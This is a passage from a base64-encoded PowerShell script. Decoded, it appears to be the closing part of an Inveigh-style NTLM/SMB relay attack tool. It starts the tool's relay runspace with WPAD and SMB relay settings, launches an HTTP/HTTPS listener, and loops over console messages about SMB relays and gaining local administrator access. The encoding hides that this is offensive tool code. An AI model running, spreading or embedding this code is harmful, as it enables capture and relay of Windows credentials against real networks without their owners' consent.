ZGRBcmd1bWVudCgkU01CUmVsYXlOZXR3b3JrVGltZW91dCkuQWRkQXJndW1lbnQoJFdQQURBdXRoKSA+ICRudWxsCiAgICAkSFRUUF9wb3dlcnNoZWxsLkJlZ2luSW52b2tlKCkgPiAkbnVsbAp9CgojIENvbnRyb2wgUmVsYXkgU3RhcnR1cCBmdW5jdGlvbgpmdW5jdGlvbiBDb250cm9sUmVsYXlMb29wKCkKewogICAgJGNvbnRyb2xfcmVsYXlfcnVuc3BhY2UgPSBbUnVuc3BhY2VGYWN0b3J5XTo6Q3JlYXRlUnVuc3BhY2UoKQogICAgJGNvbnRyb2xfcmVsYXlfcnVuc3BhY2UuT3BlbigpCiAgICAkY29udHJvbF9yZWxheV9ydW5zcGFjZS5TZXNzaW9uU3RhdGVQcm94eS5TZXRWYXJpYWJsZSgnaW52ZWlnaCcsJGludmVpZ2gpCiAgICAkY29udHJvbF9yZWxheV9wb3dlcnNoZWxsID0gW1Bvd2VyU2hlbGxdOjpDcmVhdGUoKQogICAgJGNvbnRyb2xfcmVsYXlfcG93ZXJzaGVsbC5SdW5zcGFjZSA9ICRjb250cm9sX3JlbGF5X3J1bnNwYWNlCiAgICAkY29udHJvbF9yZWxheV9wb3dlcnNoZWxsLkFkZFNjcmlwdCgkc2hhcmVkX2Jhc2ljX2Z1bmN0aW9uc19zY3JpcHRibG9jaykgPiAkbnVsbAogICAgJGNvbnRyb2xfcmVsYXlfcG93ZXJzaGVsbC5BZGRTY3JpcHQoJGNvbnRyb2xfcmVsYXlfc2NyaXB0YmxvY2spLkFkZEFyZ3VtZW50KCRSdW5UaW1lKSA+ICRudWxsCiAgICAkY29udHJvbF9yZWxheV9wb3dlcnNoZWxsLkJlZ2luSW52b2tlKCkgPiAkbnVsbAp9CgojIEhUVFAgU2VydmVyIFN0YXJ0CmlmKCRpbnZlaWdoLkhUVFAgLW9yICRpbnZlaWdoLkhUVFBTKQp7CiAgICBIVFRQTGlzdGVuZXIKfQoKIyBDb250cm9sIFJlbGF5IExvb3AgU3RhcnQKaWYoJFJ1blRpbWUgLW9yICRpbnZlaWdoLmZpbGVfb3V0cHV0KQp7CiAgICBDb250cm9sUmVsYXlMb29wCn0KCmlmKCEkaW52ZWlnaC5ydW5uaW5nIC1hbmQgJGludmVpZ2guY29uc29sZV9vdXRwdXQpCnsKCiAgICA6Y29uc29sZV9sb29wIHdoaWxlKCRpbnZlaWdoLnJlbGF5X3J1bm5pbmcgLWFuZCAkaW52ZWlnaC5jb25zb2xlX291dHB1dCkKICAgIHsKCiAgICAgICAgd2hpbGUoJGludmVpZ2guY29uc29sZV9xdWV1ZS5Db3VudCAtZ3QgMCkKICAgICAgICB7CgogICAgICAgICAgICBpZigkaW52ZWlnaC5vdXRwdXRfc3RyZWFtX29ubHkpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCgkaW52ZWlnaC5jb25zb2xlX3F1ZXVlWzBdICsgJGludmVpZ2gubmV3bGluZSkKICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuUmVtb3ZlUmFuZ2UoMCwxKQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewoKICAgICAgICAgICAgICAgIHN3aXRjaCAtd2lsZGNhcmQgKCRpbnZlaWdoLmNvbnNvbGVfcXVldWVbMF0pCiAgICAgICAgICAgICAgICB7CgogICAgICAgICAgICAgICAgICAgICJJbnZlaWdoICpleGl0ZWQgKiIKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgJGludmVpZ2guY29uc29sZV9xdWV1ZVswXQogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLlJlbW92ZVJhbmdlKDAsMSkKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICIqIHdyaXR0ZW4gdG8gKiIKICAgICAgICAgICAgICAgICAgICB7CgogICAgICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5maWxlX291dHB1dCkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlWzBdCiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuUmVtb3ZlUmFuZ2UoMCwxKQogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgIiogZm9yIHJlbGF5ICoiCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICRpbnZlaWdoLmNvbnNvbGVfcXVldWVbMF0KICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5SZW1vdmVSYW5nZSgwLDEpCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAiKlNNQiByZWxheSAqIgogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlWzBdCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuUmVtb3ZlUmFuZ2UoMCwxKQogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgIiogbG9jYWwgYWRtaW5pc3RyYXRvciAqIgogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlWzBdCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuUmVtb3ZlUmFuZ2UoMCwxKQogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgZGVmYXVsdAogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICRpbnZlaWdoLmNvbnNvbGVfcXVldWVbMF0KICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5SZW1vdmVSYW5nZSgwLDEpCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgIH0KCiAgICAgICAgfQoKICAgICAgICBpZigkaW52ZWlnaC5jb25zb2xlX2lucHV0KQogICAgICAgIHsKCiAgICAgICAgICAgIGlmKFtDb25zb2xlXTo6S2V5QXZhaWxhYmxlKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX291dHB1dCA9ICRmYWxzZQogICAgICAgICAgICAgICAgQlJFQUsgY29uc29sZV9sb29wCiAgICAgICAgICAgIH0KICAgICAgICAKICAgICAgICB9CgogICAgICAgIFN0YXJ0LVNsZWVwIC1tIDUKICAgIH0KCn0KCn0K
